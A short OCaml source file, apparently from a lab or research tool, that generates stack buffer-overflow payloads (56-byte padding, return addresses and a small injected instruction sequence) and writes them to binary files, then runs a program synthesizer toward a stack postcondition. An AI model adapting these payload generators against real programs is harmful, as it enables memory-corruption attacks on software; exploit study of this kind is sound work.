open Octosyn
open Exploit
open Syn
open Sem

let atk0 = open_out "atk0.bin"

let _ = mini_exploit 56 "42 1d 6a"
        |> (fun x -> Utils.bytes_to_raw x atk0; x)
        |> Asm.print_bytes
        |> print_newline;
  close_out atk0

let payload = "mov edi, 0x40c15130; push 0x00421d96; ret"

let atk1 = open_out "atk1.bin"

let _ = exploit_in 56 payload "55 61 3b f0"
        |> (fun x -> Utils.bytes_to_raw x atk1; x)
        |> Asm.print_bytes
        |> print_newline;
  close_out atk1

let atk2 = open_out "atk2.bin"

let _ = exploit_out 56 payload "55 61 3b f0"
        |> (fun x -> Utils.bytes_to_raw x atk2; x)
        |> Asm.print_bytes
        |> print_newline;
  close_out atk2

let _ =
  let postcond = fun x -> x.stack = [0x1] in
  let program = syn 3 subset2 postcond in
  List.iter (fun i ->
      print_instr i;
      print_newline ()
    ) program